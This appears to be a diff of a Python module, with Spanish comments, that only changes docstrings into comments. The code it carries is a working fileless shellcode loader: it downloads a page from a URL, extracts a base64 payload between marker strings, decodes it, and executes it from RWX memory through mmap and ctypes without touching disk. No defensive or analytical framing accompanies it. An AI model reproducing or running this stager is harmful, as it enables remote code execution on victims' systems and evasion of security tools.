@@ -7,9 +7,8 @@ import requests
 PAYLOAD_START = "HELLO!:"
 PAYLOAD_END   = ":!BYE"
 
-
+# Descarga el contenido HTML/texto de la URL del payload
 def _download_content(url: str) -> str | None:
-    """Descarga el contenido HTML/texto de la URL del payload."""
     try:
         resp = requests.get(url, timeout=10)
         resp.raise_for_status()
@@ -17,29 +16,23 @@ def _download_content(url: str) -> str | None:
     except Exception:
         return None
 
-
+# Extrae el payload en base64 entre los delimitadores
 def _extract_b64(content: str) -> str | None:
-    """Extrae el payload en base64 entre los delimitadores mágicos."""
     pattern = re.escape(PAYLOAD_START) + r"(.*?)" + re.escape(PAYLOAD_END)
     match = re.search(pattern, content, re.DOTALL)
     if match:
         return match.group(1).strip()
     return None
 
-
+# Decodifica base64
 def _decode_shellcode(b64_data: str) -> bytes | None:
-    """Decodifica base64 → bytes del shellcode."""
     try:
         return base64.b64decode(b64_data)
     except Exception:
         return None
 
-
+# Aloja el shellcode en memoria RWX con mmap y lo ejecuta vía ctypes sin escribir nada en disco
 def _execute_shellcode(shellcode: bytes) -> None:
-    """
-    Aloja el shellcode en memoria RWX con mmap y lo ejecuta vía ctypes.
-    No escribe nada en disco.
-    """
     size = len(shellcode)
     mem = mmap.mmap(
         -1, size,
@@ -52,9 +45,8 @@ def _execute_shellcode(shellcode: bytes) -> None:
     func_ptr = ctypes.cast(ctypes.addressof(buf), ctypes.CFUNCTYPE(None))
     func_ptr()
 
-
+# Punto de entrada del módulo
 def fetch_and_execute(url: str) -> bool:
-    """Punto de entrada del módulo: descarga → extrae → decodifica → ejecuta."""
     content = _download_content(url)
     if not content:
         return False
